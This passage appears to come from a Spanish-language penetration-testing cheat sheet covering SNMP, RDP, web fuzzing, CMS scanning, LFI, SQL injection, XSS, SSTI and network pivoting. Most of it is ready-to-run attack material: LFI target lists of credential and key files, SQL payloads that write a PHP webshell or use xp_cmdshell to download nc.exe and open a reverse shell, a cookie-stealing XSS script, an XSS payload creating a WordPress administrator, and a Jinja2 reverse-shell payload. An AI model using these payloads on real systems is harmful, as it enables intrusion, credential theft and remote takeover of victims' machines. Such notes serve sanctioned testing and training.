```sql
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
```

###  4.6. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)

El Protocolo Simple de Administración de Red, o SNMP por sus siglas en inglés, es un protocolo basado en UDP que, inicialmente, fue implementado de manera no muy segura. Cuenta con una base de datos (MIB) que almacena información relacionada con la red. El puerto predeterminado de SNMP es el 161 UDP. Hasta la tercera versión de este protocolo, SNMPv3, la seguridad de SNMP era deficiente. Existen diversas herramientas para interactuar con SNMP, ya que este protocolo puede proporcionarnos mucha información acerca de una organización, basándose en las respuestas del servidor. Algunas herramientas útiles incluyen _onesixtyone_ para realizar ataques de fuerza bruta básicos y enumeración, y _snmpwalk_ para acceder a los datos de la base de datos MIB.

La "cadena de comunidad SNMP" funciona como un ID de usuario o una contraseña que permite acceder a las estadísticas de un enrutador u otro dispositivo. Las cadenas de comunidad SNMP solo se utilizan en dispositivos que soportan los protocolos SNMPv1 y SNMPv2c. Por su parte, SNMPv3 utiliza autenticación mediante nombre de usuario/contraseña, junto con una clave de cifrado. De manera convencional, la mayoría de los dispositivos SNMPv1 y SNMPv2c que se envían de fábrica tienen la cadena de comunidad de solo lectura configurada como "public". Es una práctica estándar que los administradores de red cambien todas las cadenas de comunidad a valores personalizados durante la configuración del dispositivo.

```bash
sudo apt-get install snmp-mibs-downloader
```

```bash
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

| MIB                    | Microsoft Windows SNMP parámetros |
| ---------------------- | --------------------------------- |
| 1.3.6.1.2.1.25.1.6.0   | Procesos                          |
| 1.3.6.1.2.1.25.4.2.1.2 | Programas en ejecución            |
| 1.3.6.1.2.1.25.4.2.1.4 | Rutas de los procesos             |
| 1.3.6.1.2.1.25.2.3.1.4 | Unidades de almacenamiento        |
| 1.3.6.1.2.1.25.6.3.1.2 | Software                          |
| 1.3.6.1.4.1.77.1.2.25  | Cuentas de usuarios               |
| 1.3.6.1.2.1.6.13.1.3   | Puertos TCP locales               |

Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)

###  4.7. <a name='rdp-(3389)'></a>RDP (3389)

El protocolo RDP (Remote Desktop Protocol) es un protocolo de red desarrollado por Microsoft que permite a los usuarios conectarse de manera remota a una computadora con Windows. Utiliza el puerto 3389 por defecto y permite que los usuarios controlen una máquina a distancia, viendo su escritorio y utilizando aplicaciones como si estuvieran frente a ella. Es ampliamente utilizado para administración remota y soporte técnico.

####  4.7.1. <a name='xfreerdp'></a>xfreerdp

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
rdesktop <RHOST>
```
####  4.7.2. <a name='netexec-3'></a>Netexec

```bash
# Si NLA está deshabilitado, le permitirá tomar una captura de pantalla del mensaje de inicio de sesión
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --nla-screenshot

# Toma una captura de pantall del objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screenshot

# Enumerar los permisos en todos los recursos compartidos del objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screentime <SCREENTIME>

# Enumerar las sesiones activas en el objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --res <RESOLUTION>
```
##  5. <a name='web'></a>Web

###  5.1. <a name='enumeración'></a>Enumeración Web

####  5.1.1. <a name='fuff'></a>Fuff

```bash
# Fuzzing de directorios y archivos
ffuf -c -u http://<RHOST>/FUZZ -w <WORDLIST> -t 20
ffuf -c -u http://<RHOST>/FUZZ -mc all --fs <NUMBER> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -c -u http://<RHOST>/FUZZ -mc all --fw <NUMBER> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -c -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -w /usr/share/wordlists/dirb/common.txt -o ffuf_scan.txt
ffuf -c -u http://<RHOST>/FUZZ -recursion -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html,.cgi,.bkp,.zip

# Fuzzing a través de proxychains
ffuf -c -recursion-depth 2 -x socks5://localhost:4444 -u http://<RHOST>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php

# Fuzzing de subdominios
ffuf -c -u http://<RHOST>/FUZZ -H 'Host: FUZZ.<RHOST>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs <NUMBER>

# LFI
ffuf -c -fs <NUMBER> -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# Fuzzing con PHP Session ID
ffuf -c -fw 2644 -u "http://<RHOST>/admin/FUZZ.php" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp"

# API
ffuf -c -ac -t 250 -fc 400,404,412 -u https://<RHOST>/api/v1/FUZZ -w api_seen_in_wild.txt 
```

####  5.1.2. <a name='gobuster'></a>Gobuster

```bash
gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<RHOST>/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php
gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js -e -s 200
gobuster dir -u https://<RHOST>:<RPORT>/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 200 -k --wildcard

# VHost Discovery
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Parámetros:

- `-e` Modo extendido que muestra la URL completa
- `-k` Ingnora la validación del certificado SSL
- `-r` Redirecciones
- `-s` Código de estado
- `-b` Excluye códigos de estado
- `--wildcard` Establecer la opción comodín

####  5.1.3. <a name='wfuzz'></a>Wfuzz

```bash
# Fuzzing de directorio
wfuzz -c -u http://<RHOST>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 403,404

# Fuzzing de archivos
wfuzz -c -u http://<RHOST>/FUZZ/<FILE>.php -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 403,404 -f <FILE>

# Fuzzing de dos parámetros
wfuzz -c -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -z list,txt-php --hc 403,404

# Subdominios
wfuzz <RHOST> -H "Host: FUZZ.<RHOST>" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 200 --hw 356 -t 100

# Login
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt--hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --ss "Username or Password Invalid"
```

####  5.1.4. <a name='gittools'></a>GitTools

```bash
python3 git-dumper.py http://<RHOST>/.git/ website
./extractor.sh website
```

###  5.2. <a name='enumeración-de-cms'></a>Enumeración de CMS

####  5.2.1. <a name='wordpress'></a>Wordpress
##### WPScan

Enumeración de temas y plugins Wordpress

```bash
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
wpscan --url http://<RHOST>/wordpress --api-token $WP_TOKEN --plugins-detection aggressive
```

> La variable de entorno `$WP_TOKEN` contiene el token generado en la web [https://wpscan.com/](https://wpscan.com/)

##### Nuclei

```bash
nuclei -u http://<RHOST>/wordpress/ -tags fuzz -t /home/d4redevil/.local/nuclei-templates/http/fuzzing/wordpress-plugins-detect.yaml
```
##### Gobuster

```bash
gobuster dir -u http://<RHOST>/wordpress/ -w /usr/share/seclists/Discovery/WebContent/CMS/wp-plugins.fuzz.txt
```

####  5.2.2. <a name='joomla'></a>Joomla

```bash
joomscan -u http://<RHOST>
```

####  5.2.3. <a name='drupal'></a>Drupal

```bash
droopescan scan drupal -u http://<RHOST> -t 32
```

####  5.2.4. <a name='magento'></a>Magento

```bash
php magescan.phar scan:all http://<RHOST>
```
###  5.3. <a name='local-file-inclusion-(lfi)'></a>Local File Inclusion (LFI)

```
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```

#### Hasta php 5.3

```
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

#### php://filter Wrapper

```
url=php://filter/convert.base64-encode/resource=app.php
```

#### Archivos Linux

```
/app/etc/local.xml
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

#### Archivos Windows

```
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

###  5.4. <a name='sql-injection'></a>SQL Injection

####  5.4.1. <a name='mysql'></a>MySQL

##### Obtener el número de columnas

```sql
-1 ORDER BY 3;#
-1 ORDER BY 3;--1-
```

##### Obtener la versión
```sql
-1 UNION SELECT 1,VERSION(),3;#
```
##### Obtener el nombre de la base de datos en uso

```sql
-1 UNION SELECT 1,DATABASE(),3;#
```

##### Obtener nombre de las tablas

```sql
-1 UNION SELECT 1,2, GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE>";#
```

##### Obtener el nombre de las columnas

```sql
-1 UNION SELECT 1,2, GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="<DATABASE>" AND TABLE_NAME="<TABLE>";#
```

##### Leer un archivo

```sql
SELECT LOAD_FILE('/etc/passwd')
```

##### Dump Data

```sql
-1 UNION SELECT 1,2, GROUP_CONCAT(<COLUMN>) FROM <DATABASE>.<TABLE>;#
```

##### Crear una Webshell

```sql
LOAD_FILE('/etc/httpd/conf/httpd.conf')
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php";
```

```sql
LOAD_FILE('/etc/httpd/conf/httpd.conf')
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```

####  5.4.2. <a name='mssql'></a>MSSQL

##### Bypass de Autenticación

```sql
' or 1=1--
```

##### Obtener la versión con una Time-Based Injection

```sql
' SELECT @@version; WAITFOR DELAY '00:00:10'; —
```

##### Habilitar xp_cmdshell

```sql
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```
##### Ejeecución Remota de Comandos (RCE)

```sql
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
```

```sql
' EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.206:/nc.exe C:\windows\temp\nc.exe';EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.206 4444 -e cmd.exe';--
```

####  5.4.3. <a name='oracle-sql'></a>Oracle SQL

##### Bypass de Autenticación

```sql
' or 1=1--
```

##### Obtener el número de columnas

```sql
' order by 3--
```

##### Obtener el nombre de la tabla

```sql
' union select null,table_name,null from all_tables--
```

##### Obtener el nombre de la columna

```sql
' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
```

##### Dump Data

```sql
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

####  5.4.4. <a name='error-based-sql-injection-(sqli)'></a>Error-based SQL Injection (SQLi)


```sql
<USERNAME>' OR 1=1 -- //
```

Genera la siguiente consulta

```sql
SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
```

```sql
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

####  5.4.5. <a name='union-based-sql-injection-(sqli)'></a>UNION-based SQL Injection (SQLi)

> https://d4redevil.gitbook.io/d4redevil/owasp-top-10-y-vulnerabilidades-web/inyecciones-sql/inyecciones-sql-basada-en-uniones

##### Inyección SQL manual - Pasos

```sql
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search"]."%'";
```

```sql
' ORDER BY 1-- //
```

```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
```

```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
```

```sql
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```sql
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
```

```sql
' UNION SELECT null, username, password, description, null FROM users -- //
```

##### Blind SQL Injection (SQLi)

> https://d4redevil.gitbook.io/d4redevil/owasp-top-10-y-vulnerabilidades-web/inyecciones-sql/inyecciones-sql-basadas-en-booleanos

```sql
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```

```sql
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```

####  5.4.6. <a name='sql-truncation-attack'></a>SQL Truncation Attack

```bash
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

###  5.5. <a name='cross-site-scripting-(xss)'></a>Cross-Site Scripting (XSS)

```html
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```

####  5.5.1. <a name='petición-vía-ajax---get'></a>Petición vía Ajax - GET

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

####  5.5.2. <a name='petición-vía-ajax---post'></a>Petición vía Ajax - POST
```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

####  5.5.3. <a name='comprimir-script'></a>Comprimir script

> https://jscompress.com/

```javascript
var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```


###  5.6. <a name='xml-external-entity-(xxe)'></a>XML External Entity (XXE)
###  5.7. <a name='server-side-request-forgery-(ssrf)'></a>Server-Side Request Forgery (SSRF)
###  5.8. <a name='server-side-template-injection-(ssti)'></a>Server-Side Template Injection (SSTI)

```bash
http://<RHOST>/index.php?view=<RHOST>://shell.php
```

####  5.8.1. <a name='magic-payload'></a>Magic Payload

```bash
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

####  5.8.2. <a name='jinja-2---reverse-shell'></a>Jinja 2 - Reverse Shell

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").read()}}{%endif%}{%endfor%}
```

##  6. <a name='pivoting'></a>Pivoting

###  6.1. <a name='chisel'></a>Chisel
####  6.1.1. <a name='servidor-(atacante)'></a>Servidor (Atacante)

```bash
chisel server -p 8000 --reverse --socks5
```
####  6.1.2. <a name='cliente-(víctima)'></a>Cliente (Víctima)

Linux

```bash
./chisel client <IP-CHISEL-SERVER>:8000 R:8000:socks
./chisel client <IP-CHISEL-SERVER>:8000 R:3000:127.0.0.1:3000
```

Windows

```powershell
.\chisel.exe client <ipKali>:8000 R:4444:socks 9001:127.0.0.1:9001 8888:127.0.0.1:80
```

- Proxy socks en puerto Kali 4444
- Mapea 9001 MS01 a 9001 Kali
- Mapea 8888 MS01 a 80 Kali
####  6.1.3. <a name='socat'></a>Socat

Port Forwarding

```bash
./socat tcp-listen:2222,fork,reuseaddr tcp:10.10.10.5:8000 &
```

Exponer un puerto local

```bash
socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
```

> En este caso, el puerto `8080` no esta expuesto fuera del equipo local, pero con el comando anterior exponemos el puerto hacia fuera a través del puerto `8282`.

###  6.2. <a name='ligolo-ng'></a>Ligolo-ng

####  6.2.1. <a name='descargar-el-proxy-y-el-agente'></a>Descargar el Proxy y el Agente

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.7.5_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.7.5_Linux_64bit.tar.gz
```

####  6.2.2. <a name='preparar-las-interfaces-para-el-tunel'></a>Preparar las interfaces para el tunel

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

####  6.2.3. <a name='configurar-proxy-en-kali'></a>Configurar proxy en Kali

```bash
./proxy -laddr <LHOST>:443 -selfcert
```

####  6.2.4. <a name='configurar-el-agente-en-la-máquina-víctima'></a>Configurar el agente en la máquina víctima

```bash
./agent -connect <LHOST>:443 -ignore-cert
```

####  6.2.5. <a name='configurar-la-sesión'></a>Configurar la sesión

```bash
ligolo-ng » session
